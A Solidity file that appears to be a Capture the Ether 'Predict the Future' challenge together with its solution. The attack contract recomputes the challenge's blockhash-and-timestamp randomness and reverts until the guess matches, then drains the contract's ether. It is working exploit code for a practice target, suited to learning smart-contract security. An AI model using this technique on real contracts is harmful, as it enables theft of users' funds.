pragma solidity ^0.8.0;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;

        guesser = address(0);
        if (guess == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}


contract PredictTheFutureAttack {
    PredictTheFutureChallenge victim;
    uint8 solution;
    
    constructor (address _victim) {
        victim = PredictTheFutureChallenge(_victim);
    }

    function attackStep1() external payable {
        require(msg.value == 1 ether);
        solution = 1;
        victim.lockInGuess{value: 1 ether}(solution);

    }

    function answer() external view returns (uint8) {
        return uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
    }

    function attackStep2() external {
        uint8 _answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(_answer == solution, "solution != answer");
        victim.settle();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        
    }

}
